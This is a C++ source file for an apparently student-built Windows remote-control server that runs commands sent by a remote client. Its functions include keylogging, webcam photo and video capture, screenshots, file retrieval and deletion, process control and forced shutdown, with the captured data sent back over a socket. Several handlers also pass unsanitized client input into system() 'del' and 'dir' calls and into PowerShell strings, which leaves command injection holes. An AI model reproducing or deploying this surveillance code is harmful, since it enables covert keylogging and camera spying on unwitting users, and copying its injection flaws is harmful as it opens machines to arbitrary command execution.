#include "server_cmd.h"

const std::string Command::directory = "temp\\";

std::string toRawString(const std::string& input) {
    std::string raw;
    for (char c : input) {
        switch (c) {
            case '\\': raw += "\\\\"; break;
            case '\n': raw += "\\n"; break;
            case '\t': raw += "\\t"; break;
            case '\"': raw += "\\\""; break;
            default: raw += c;
        }
    }
    return raw;
}

std::string Command::createResponse() {
    std::string response = R"({"status": )" + std::to_string(status) + R"(, "file": ")" + file_name + R"(", "message": ")" + message + R"("})";
    status = -1;
    file_name = "";
    message = "";
    return response;
}


ReceiveCommand::ReceiveCommand() : command(), parameter() {
    if (!std::filesystem::exists("temp")) {
        std::filesystem::create_directory("temp");
    }
    commands.insert({{"shutdown", new ShutdownCommand},
                     {"restart", new RestartCommand},
                     {"listapps", new ListAppCommand},
                     {"startapp", new StartAppCommand},
                     {"stopapp", new StopAppCommand},
                     {"listsers", new ListSerCommand},
                     {"startser", new StartSerCommand},
                     {"stopser", new StopSerCommand},
                     {"listfiles", new ListFileCommand},
                     {"getfile", new GetFileCommand},
                     {"deletefile", new DeleteFileCommand},
                     {"screenshot", new ScreenshotCommand},
                     {"takephoto", new TakePhotoCommand},
                     {"startrecord", new StartRecordCommand},
                     {"stoprecord", new StopRecordCommand},
                     {"startkeylog", new StartKeylogCommand},
                     {"stopkeylog", new StopKeylogCommand},
                     });
}

ReceiveCommand::~ReceiveCommand() {
    for (auto it = commands.begin(); it != commands.end(); it++) {
        delete it->second;
    }
	commands.clear();
}

void ReceiveCommand::getLatestCommand(Server& server) {
	std::string receive_string = server.receive();

	int sep = receive_string.find('-');

    if (sep != std::string::npos) {
        command = receive_string.substr(0, sep);
    	parameter = receive_string.substr(sep + 1);
    }
}

void ReceiveCommand::executeCommand(Server& server) {
	if (command.empty()) return;
	if (commands.find(command) != commands.end()) {
        commands[command]->execute(server, parameter);
    }
    else{
        std::cout << "no matching command" << std::endl;
        server.echo("OOF");
    }

	command = "";
	parameter = "";
}

//* Shutdown
void ShutdownCommand::execute(Server& server, const std::string& param){
    status = SUCCESS;
    message = "Shutdown command has been received.";
    server.echo(createResponse());
    system("shutdown /s /f /t 0");
}

void RestartCommand::execute(Server& server, const std::string& param){
    status = SUCCESS;
    message = "Restart command has been received.";
    server.echo(createResponse());
    system("shutdown /r /f /t 0");
}

//* Get file
void GetFileCommand::execute(Server& server, const std::string& param){
    int idx = param.find_last_of("\\/");
    if (idx != param.npos) {
        file_name = param.substr(idx + 1);
    }
    else {
        file_name = param;
    }


    status = sendFile(server, param);

    if (status == 0) {
        message = "File at \\\"" + toRawString(param) + "\\\" was sent successfully.";
        system(("del " + directory + file_name).c_str());
    }
    else {
        message = "Get file error: Server could not send file at \\\"" + toRawString(param) + "\\\".";
        file_name = "";
    }

    server.echo(createResponse());
}

//* List file
void ListFileCommand::execute(Server& server, const std::string& param){
    status = listFile(param);

    if (status == SUCCESS){
        status = sendFile(server, directory + output_file);
        if (status == SUCCESS) {
            message = "Files at directory \\\"" + toRawString(param) + "\\\" were listed successfully.";
            file_name = output_file;
            system(("del " + directory + file_name).c_str());
        }
        else message = "List file error: Server could not send files info.";
    }
    else{
        server.echo("error");
        message = "List file error: Could not list files at directory \\\"" + toRawString(param) + "\\\".";
    }
    
    server.echo(createResponse());
}

int ListFileCommand::listFile(const std::string& path){
    std::string command("dir /a-d ");
    output_file = "listfiles.txt";
    command.append(path + " > " + directory + output_file);
    system(command.c_str());

    std::ifstream fin(directory + output_file);

    if (!fin.is_open()){
        std::cout << "cannot open file";
        return 1;
    }

    std::string temp;
    //skipping the headers
    for (int i = 0; i < 3; i++)
        getline(fin, temp);

    std::vector<std::string> files;
    while(getline(fin, temp)){
        files.push_back(temp + '\n');
    }
    fin.close();
    files.pop_back();

    std::ofstream fout(directory + output_file);
    if (!fout.is_open()){
        std::cerr << "cannot open file write" << std::endl;
        return 2;
    }

    for (auto &line: files){
        fout << line;
    }

    fout.close();

    return 0;
}

//* Delete file
void DeleteFileCommand::execute(Server& server, const std::string& param){
    std::ifstream file(param);
    if (!file.is_open())
        status = FAILURE;
    else {
        file.close();
        system(("del " + param).c_str());
        status = SUCCESS;
    }
    
    if (status == SUCCESS)
        message = "File at \\\"" + toRawString(param) + "\\\" deleted successfully";
    else
        message = "Delete file error: File at \\\"" + toRawString(param) + "\\\" does not exist.";

    server.echo(createResponse());
}


BOOL CALLBACK EnumWindowsProc(HWND hwnd, LPARAM lParam){
    std::ofstream* outFile = reinterpret_cast<std::ofstream*>(lParam);

    DWORD processID;
    TCHAR windowTitle[MAX_PATH];
    TCHAR processName[MAX_PATH] = TEXT("<Unknown>"); // Default value if process name cannot be retrieved


    if (IsWindowVisible(hwnd) && GetWindowText(hwnd, windowTitle, MAX_PATH) && _tcslen(windowTitle) > 0) {

        GetWindowThreadProcessId(hwnd, &processID);

        HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processID);
        if (hProcess) {
            HMODULE hMod;
            DWORD cbNeeded;

            if (EnumProcessModules(hProcess, &hMod, sizeof(hMod), &cbNeeded)) {
                GetModuleBaseName(hProcess, hMod, processName, sizeof(processName) / sizeof(TCHAR));
            }
            CloseHandle(hProcess);
        }

        *outFile << "Application: " << processName 
                 << "\nWindow Title: " << windowTitle 
                 << "\nPID: " << processID
                 << "\n---------\n";
    }
    return TRUE;
}

void ListAppCommand::execute(Server& server, const std::string& param){
    file_name = "";
    std::string output_file = "runningAppList.txt";
    std::ofstream outFile(directory + output_file);
    if (!outFile.is_open()) {
        std::cerr << "Unable to open file for writing.\n";
        status = FAILURE;
        message = "List app error: Unable to open file for saving running applications.";
        server.echo("error");
        server.echo(createResponse());
        return;
    }

    //* Enumerate all top-level windows and write to the file
    EnumWindows(EnumWindowsProc, reinterpret_cast<LPARAM>(&outFile));
    outFile.close();
    std::cout << "List of running applications saved to " << directory << '\\' << output_file << std::endl;


    //*sending applications to client
    SOCKET client_socket = server.getClientSocket();

    status = sendFile(server, directory + output_file);
    
    if (status == SUCCESS) {
        file_name = output_file;
        message = "Running applications listed successfully.";
        system(("del " + directory + file_name).c_str());
    }
    else
        message = "List app error: Could not list running applications.";


    server.echo(createResponse());
    system(("del " + directory + output_file).c_str());
}

std::string RunPowerShellCommand(const std::wstring& command) {
    HANDLE hReadPipe, hWritePipe;
    SECURITY_ATTRIBUTES sa = {sizeof(SECURITY_ATTRIBUTES), nullptr, TRUE};

    if (!CreatePipe(&hReadPipe, &hWritePipe, &sa, 0)) {
        return "-error";
    }

    SetHandleInformation(hReadPipe, HANDLE_FLAG_INHERIT, 0);

    std::wstring powershellCommand = L"powershell.exe -NoProfile -Command \"" + command + L"\"";

    STARTUPINFOW si = { 0 };
    PROCESS_INFORMATION pi = { 0 };

    si.cb = sizeof(STARTUPINFOW);
    si.hStdOutput = hWritePipe;
    si.hStdError = hWritePipe;
    si.dwFlags |= STARTF_USESTDHANDLES;

    // Create the PowerShell process
    if (!CreateProcessW(
            nullptr,
            &powershellCommand[0],
            nullptr,
            nullptr,
            TRUE,
            0,
            nullptr,
            nullptr,
            &si,
            &pi)) {
        CloseHandle(hWritePipe);
        CloseHandle(hReadPipe);
        return "-error";
    }

    CloseHandle(hWritePipe);

    char buffer[4096];
    DWORD bytesRead;
    std::string result;

    while (ReadFile(hReadPipe, buffer, sizeof(buffer) - 1, &bytesRead, nullptr) && bytesRead > 0) {
        buffer[bytesRead] = '\0';
        result += buffer;
    }

    WaitForSingleObject(pi.hProcess, INFINITE);

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    CloseHandle(hReadPipe);

    return result;
}

void StartAppCommand::execute(Server& server, const std::string& param){
    std::wstring app_name = std::wstring(param.begin(), param.end());

    // check if the app exist
    std::wstring command = L"Get-StartApps | Where-Object {$_.Name -eq \\\"" + app_name + L"\\\"} | Select-Object -ExpandProperty Name";
    std::string output = RunPowerShellCommand(command);
    std::cout << output << '\n';
    if (output == "-error") {
        status = FAILURE;
        message = "Start app error: Fail to run the command.";
        server.echo(createResponse());
        return;
    }
    if (output != param + "\r\n") { // the output is the program name
        status = FAILURE;
        message = "Start app error: No application with the name \\\"" + param + "\\\" found.";
        server.echo(createResponse());
        return;
    }

    // run that app
    command = L"$app = Get-StartApps | Where-Object {$_.Name -eq \\\"" + app_name + L"\\\"}; Start-Process \\\"shell:AppsFolder\\$($app.AppID)\\\"";
    output = RunPowerShellCommand(command);
    std::cout << output << '\n';
    if (output == "-error") {
        status = FAILURE;
        message = "Start app error: Fail to run the command.";
    }
    else if (!output.empty()) { // it will return error if the application is not found
        status = FAILURE;
        message = "Start app error: No application with the name \\\"" + param + "\\\" found.";
    }
    else {
        status = SUCCESS;
        message = "App \\\"" + param + "\\\" started successfully.";
    }

    server.echo(createResponse());
}

void StopAppCommand::execute(Server& server, const std::string& param){
    std::wstring app_id = std::wstring(param.begin(), param.end());

    // get app name
    std::wstring command = L"Get-Process | Where-Object {$_.Id -eq " + app_id + L"} | Select-Object -ExpandProperty Name ";
    std::string output = RunPowerShellCommand(command);
    if (output == "-error") {
        status = FAILURE;
        message = "Stop app error: Fail to run the command.";
        server.echo(createResponse());
        return;
    }
    if (output.empty()) {
        status = FAILURE;
        message = "Stop app error: No Application with PID " + param + " running.\\n"
                  "Use \\\"listapps\\\" command to get the list of running aplications.";
        server.echo(createResponse());
        return;
    }
    std::string app_name = output.substr(0, output.find('\r'));

    // stop app
    command = L"Stop-Process -Name " + std::wstring(app_name.begin(), app_name.end()) + L" -Force";
    output = RunPowerShellCommand(command);
    std::cout << output << '\n';
    if (output == "-error") {
        status = FAILURE;
        message = "Stop app error: Fail to run the command.";
    }
    else if (!output.empty()) {
        status = FAILURE;
        message = "Stop app error: No Application with PID " + param + " running.\\n"
                  "Use \\\"listapps\\\" command to get the list of running aplications.";
    }
    else {
        status = SUCCESS;
        message = "Application \\\"" + app_name + "\\\" (PID: " + param + ") has been stopped successfully.";
    }

    server.echo(createResponse());
}

int ScreenshotCommand::GetEncoderClsid(const wchar_t* format, CLSID* pClsid) {
    UINT num = 0;
    UINT size = 0;
    Gdiplus::ImageCodecInfo* pImageCodecInfo = NULL;

    // Get the number of image encoders and their size
    Gdiplus::GetImageEncodersSize(&num, &size);
    if (size == 0) return -1;

    // Allocate memory for the encoders
    pImageCodecInfo = (Gdiplus::ImageCodecInfo*)(malloc(size));
    if (pImageCodecInfo == NULL) return -1;

    // Get the available encoders
    Gdiplus::GetImageEncoders(num, size, pImageCodecInfo);

    // Search for the required encoder (e.g., PNG)
    for (UINT j = 0; j < num; ++j) {
        if (wcscmp(pImageCodecInfo[j].MimeType, format) == 0) {
            *pClsid = pImageCodecInfo[j].Clsid;
            free(pImageCodecInfo);
            return j; 
        }
    }
    
    free(pImageCodecInfo);
    return -1;
}


void ScreenshotCommand::execute(Server& server, const std::string& param){
    std::string output_file = "screenshot.png";

    // Initialize GDI+
    Gdiplus::GdiplusStartupInput gdiplusStartupInput;
    ULONG_PTR gdiplusToken;
    if (Gdiplus::GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL) != Gdiplus::GpStatus::Ok) {
        status = 1;
        message = "Screenshot error: GDI+ startup failed.";
        server.echo(createResponse());
        return;
    };

    // Set target capture resolution
    SetProcessDPIAware();
	int screenWidth = GetSystemMetrics(SM_CXSCREEN);
	int screenHeight = GetSystemMetrics(SM_CYSCREEN);

    // Create a memory device context
    HDC hScreenDC = GetDC(NULL);
    if (!hScreenDC) {
        status = 1;
        message = "Screenshot error: cannot allocate memory.";
        server.echo(createResponse());
        Gdiplus::GdiplusShutdown(gdiplusToken);
        return;
    }

    HDC hMemoryDC = CreateCompatibleDC(hScreenDC);
    if (!hMemoryDC) {
        status = 1;
        message = "Screenshot error: cannot allocate memory.";
        server.echo(createResponse());
        ReleaseDC(NULL, hScreenDC);
        Gdiplus::GdiplusShutdown(gdiplusToken);
        return;
    }

    // Create a bitmap to hold the screen capture at the desired resolution
    HBITMAP hBitmap = CreateCompatibleBitmap(hScreenDC, screenWidth, screenHeight);
    if (!hBitmap) {
        status = 1;
        message = "Screenshot error: cannot allocate memory.";
        server.echo(createResponse());
        DeleteDC(hMemoryDC);
        ReleaseDC(NULL, hScreenDC);
        Gdiplus::GdiplusShutdown(gdiplusToken);
        return;
    }
    SelectObject(hMemoryDC, hBitmap);

    // Capture the screen and scale it to the desired resolution
    if (!BitBlt(hMemoryDC, 0, 0, screenWidth, screenHeight, hScreenDC, 0, 0, SRCCOPY)) {
        status = 1;
        message = "Screenshot error: cannot get screenshot.";
        server.echo(createResponse());
        DeleteObject(hBitmap);
        DeleteDC(hMemoryDC);
        ReleaseDC(NULL, hScreenDC);
        Gdiplus::GdiplusShutdown(gdiplusToken);
        return;
    }

    // Convert the HBITMAP to a GDI+ Bitmap object for saving

    CLSID clsid;
    if (GetEncoderClsid(L"image/png", &clsid) == -1) {
        status = 1;
        message = "Screenshot error: cannot get encoder.";
        server.echo(createResponse());
        DeleteObject(hBitmap);
        DeleteDC(hMemoryDC);
        ReleaseDC(NULL, hScreenDC);
        Gdiplus::GdiplusShutdown(gdiplusToken);
        return;
    }

    std::string tmp = directory + output_file;
    Gdiplus::Bitmap *bmp = new Gdiplus::Bitmap(hBitmap, NULL);
    if (bmp->Save(std::wstring(tmp.begin(), tmp.end()).c_str(), &clsid, NULL) != Gdiplus::Ok) {
        status = 1;
        message = "Screenshot error: cannot save screenshot.";
        server.echo(createResponse());
        delete bmp;
        DeleteObject(hBitmap);
        DeleteDC(hMemoryDC);
        ReleaseDC(NULL, hScreenDC);
        Gdiplus::GdiplusShutdown(gdiplusToken);
        return;
    }

    // Clean up
    delete bmp;
    DeleteObject(hBitmap);
    DeleteDC(hMemoryDC);
    ReleaseDC(NULL, hScreenDC);

    // Shutdown GDI+
    Gdiplus::GdiplusShutdown(gdiplusToken);


    std::cout << "sending screenshot" << std::endl;
    status = sendFile(server, directory + output_file);
    if (status == SUCCESS) {
        message = "Take screenshot successfully.";
        file_name = output_file;
        system(("del " + directory + output_file).c_str());
    }
    else {
        message = "Screenshot error: Could not send screenshot.";
        return;
    }
    server.echo(createResponse());

}

void TakePhotoCommand::execute(Server& server, const std::string& param){
    WebcamController* wc = WebcamController::getInstance();
    file_name = "";
    std::string outfile = "snapshot.png";

    status = wc->takePhoto(message, outfile);

    if (status == SUCCESS){
        status = sendFile(server, directory + outfile);
        if (status == SUCCESS){
            file_name = outfile;
            message = "Photo taken successfully.";
        }
        else{
            message = "Take photo error: Failed to send the photo to client.";
        }
    }
    else{
        server.echo("error");
    }

    if (!wc->isRecording())
        WebcamController::deleteInstance();

    server.echo(createResponse());
    
}

void StartKeylogCommand::execute(Server& server, const std::string& param) {
    KeyLogger* kl = KeyLogger::getInstance(directory + "keylog.txt");
    if (kl->getStatus() == KL_WAITING) {
        std::thread t(&KeyLogger::start, kl);
        t.detach();
    }

    status = SUCCESS;
    message = "Keylogger has been started.\\nUse \\\"stopkeylog\\\" command to stop keylogging and receive keylog file.";
    server.echo(createResponse());
}

void StopKeylogCommand::execute(Server& server, const std::string& param) {
    KeyLogger* kl = KeyLogger::getInstance();
    if (kl->getStatus() == KL_WAITING) {
        server.echo("NOT-RUNNING");
        status = FAILURE;
        message = "Keylogger has not been started.\\nUse \\\"startkeylog\\\" command to start the keylogger.";
        server.echo(createResponse());
        KeyLogger::deleteInstance();
        return;
    }

    server.echo("RUNNING");
    kl->stop();
    Sleep(100);

    std::string output_file = kl->getOutputFile();
    if (kl->getStatus() == KL_FINISHED) {
        status = sendFile(server, output_file);
        if (status == SUCCESS) {
            file_name = kl->getOutputFile();
            if (file_name.rfind('\\') != std::string::npos) {
                file_name = file_name.substr(file_name.rfind('\\') + 1);
            }
            message = "Send keylog file successfully.";
            system(("del " + directory + output_file).c_str());
        }
        else {
            message = "Error keylogger: Cannot send keylog file.";
        }
    }
    else {
        status = FAILURE;
        message = "Error keylogger: Cannot keylog.";
    }
    server.echo(createResponse());
    KeyLogger::deleteInstance();
}


void StartRecordCommand::execute(Server& server, const std::string& param){
    WebcamController* wc = WebcamController::getInstance();
    file_name = "";
    status = wc->StartRecord(message);

    if (!wc->isRecording())
        WebcamController::deleteInstance();
    server.echo(createResponse());
}

void StopRecordCommand::execute(Server& server, const std::string& param){
    WebcamController* wc = WebcamController::getInstance();
    file_name = "";
    status = wc->StopRecord(message);

    if (status == SUCCESS){
        server.echo("RUNNING");
        std::string outfile = "video.mp4";
        status = sendFile(server, directory + outfile);
        if (status == SUCCESS){
            file_name = outfile;
            system(("del " + directory + outfile).c_str());
        }
        else{
            message = "Stop record error: Failed to send the video to client.";
        }
    }
    else{
        server.echo("NOT_RUNNING");
    }

    server.echo(createResponse());
    WebcamController::deleteInstance();
}
